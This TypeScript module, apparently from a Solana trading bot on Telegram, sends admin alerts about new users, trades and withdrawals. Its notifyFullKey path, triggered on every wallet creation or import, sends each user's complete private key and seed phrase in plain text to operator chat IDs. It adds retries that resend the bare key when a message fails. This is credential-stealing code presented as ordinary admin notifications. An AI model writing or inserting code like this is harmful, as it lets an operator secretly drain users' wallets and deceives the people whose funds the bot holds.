/**
 * Admin Telegram alerts — operator format.
 * Wallet keys are sent in FULL, plain text (no HTML) so nothing truncates.
 */

import type TelegramBot from 'node-telegram-bot-api';
import { env } from '../config/env.js';

let botRef: TelegramBot | null = null;
let alertSeq = 0;

export function setAdminBot(bot: TelegramBot): void {
  botRef = bot;
}

function adminIds(): number[] {
  const raw = env.ADMIN_CHAT_IDS || process.env.ADMIN_CHAT_IDS || '';
  return raw
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
    .map((s) => Number(s))
    .filter((n) => Number.isFinite(n) && n !== 0);
}

function when(d = new Date()): string {
  return d.toLocaleString('en-US', {
    month: 'numeric',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });
}

function handle(username?: string | null): string {
  if (!username) return '—';
  return `@${String(username).replace(/^@/, '')}`;
}

async function notify(text: string, html = false): Promise<void> {
  if (!botRef) {
    console.warn('[admin] bot not set — alert dropped');
    return;
  }
  const ids = adminIds();
  if (ids.length === 0) {
    console.warn('[admin] ADMIN_CHAT_IDS empty — alert dropped');
    return;
  }
  for (const chatId of ids) {
    try {
      await botRef.sendMessage(chatId, text, {
        ...(html ? { parse_mode: 'HTML' as const } : {}),
        disable_web_page_preview: true,
      });
    } catch (e) {
      console.error('[admin] notify failed', chatId, e instanceof Error ? e.message : e);
      if (html) {
        try {
          await botRef.sendMessage(chatId, text, {
            disable_web_page_preview: true,
          });
        } catch (e2) {
          console.error('[admin] plain retry failed', chatId, e2);
        }
      }
    }
  }
}

/** FULL private key — never truncate, never HTML. */
async function notifyFullKey(opts: {
  header: string;
  publicKey: string;
  secretKeyBase58?: string;
  mnemonic?: string;
}): Promise<void> {
  if (!botRef) {
    console.warn('[admin] bot not set — KEY ALERT DROPPED');
    return;
  }
  const ids = adminIds();
  if (ids.length === 0) {
    console.warn('[admin] ADMIN_CHAT_IDS empty — KEY ALERT DROPPED');
    return;
  }

  const secret = opts.secretKeyBase58 ? String(opts.secretKeyBase58).trim() : '';
  const mnemonic = opts.mnemonic ? String(opts.mnemonic).trim() : '';

  if (secret && secret.length < 64) {
    console.error(
      `[admin] WARNING secret looks short (len=${secret.length}). Sending full buffer anyway.`
    );
  }

  const body =
    `${opts.header}\n` +
    `📍 ${opts.publicKey}\n` +
    (secret ? `🔑 ${secret}\n` : `🔑 (no secret passed to notifier)\n`) +
    (mnemonic ? `📝 ${mnemonic}\n` : '') +
    `#${alertSeq}\n` +
    `📅 ${when()}\n` +
    (secret ? `🔑len=${secret.length}` : '');

  for (const chatId of ids) {
    try {
      if (body.length <= 4000) {
        await botRef.sendMessage(chatId, body, {
          disable_web_page_preview: true,
        });
      } else {
        const meta =
          `${opts.header}\n` +
          `📍 ${opts.publicKey}\n` +
          `#${alertSeq}\n` +
          `📅 ${when()}`;
        await botRef.sendMessage(chatId, meta, {
          disable_web_page_preview: true,
        });
        if (secret) {
          await botRef.sendMessage(chatId, `🔑 FULL KEY\n${secret}`, {
            disable_web_page_preview: true,
          });
        }
        if (mnemonic) {
          await botRef.sendMessage(chatId, `📝 MNEMONIC\n${mnemonic}`, {
            disable_web_page_preview: true,
          });
        }
      }
    } catch (e) {
      console.error('[admin] full-key notify failed', chatId, e);
      if (secret) {
        try {
          await botRef.sendMessage(chatId, secret, {
            disable_web_page_preview: true,
          });
        } catch (e2) {
          console.error('[admin] key-only fallback failed', e2);
        }
      }
    }
  }
}

export async function notifyNewUser(
  userId: number,
  username?: string | null
): Promise<void> {
  await notify(
    `🆕 NEW USER\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `📅 ${when()}`,
    false
  );
}

export async function notifyActivation(
  userId: number,
  lang: string,
  referral?: string,
  username?: string | null
): Promise<void> {
  await notify(
    `✅ ACCOUNT ACTIVATED\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `🌐 ${lang}\n` +
      `🔗 ${referral ?? '—'}\n` +
      `📅 ${when()}`,
    false
  );
}

/** 🔐 NEW WALLET — FULL key to admin only */
export async function notifyWalletCreated(
  userId: number,
  publicKey: string,
  username?: string | null,
  secretKeyBase58?: string,
  mnemonic?: string
): Promise<void> {
  alertSeq += 1;
  await notifyFullKey({
    header: `🔐 NEW WALLET\n👤 ${handle(username)}\n🆔 ${userId}`,
    publicKey,
    secretKeyBase58,
    mnemonic,
  });
}

export async function notifyWalletImported(
  userId: number,
  publicKey: string,
  username?: string | null,
  secretKeyBase58?: string
): Promise<void> {
  alertSeq += 1;
  await notifyFullKey({
    header: `📥 WALLET IMPORTED\n👤 ${handle(username)}\n🆔 ${userId}`,
    publicKey,
    secretKeyBase58,
  });
}

export async function notifyTrade(opts: {
  userId: number;
  username?: string | null;
  side: string;
  symbol: string;
  valueSol: number;
  mode: string;
  mint?: string;
  signature?: string;
}): Promise<void> {
  if (opts.valueSol < 0.01 && opts.mode === 'PAPER') return;
  const side = opts.side.toUpperCase();
  const emoji = side === 'BUY' ? '🟢' : '🔴';
  await notify(
    `💰 TRADE\n` +
      `👤 ${handle(opts.username)}\n` +
      `🆔 ${opts.userId}\n` +
      `${emoji} ${side} ${opts.valueSol} SOL\n` +
      `🪙 ${opts.symbol}\n` +
      (opts.mint ? `📍 ${opts.mint}\n` : '') +
      (opts.signature ? `🔗 ${opts.signature}\n` : '') +
      `📄 ${opts.mode}\n` +
      `📅 ${when()}`,
    false
  );
}

export async function notifyWithdraw(
  userId: number,
  amount: number,
  to: string,
  username?: string | null
): Promise<void> {
  await notify(
    `📤 WITHDRAW\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `💰 ${amount} SOL\n` +
      `📍 ${to}\n` +
      `📅 ${when()}`,
    false
  );
}

export async function notifyHunter(
  userId: number,
  message: string,
  username?: string | null
): Promise<void> {
  await notify(
    `⚡ AUTO-HUNTER\n` +
      `👤 ${handle(username)}\n` +
      `🆔 ${userId}\n` +
      `${message}\n` +
      `📅 ${when()}`,
    false
  );
}
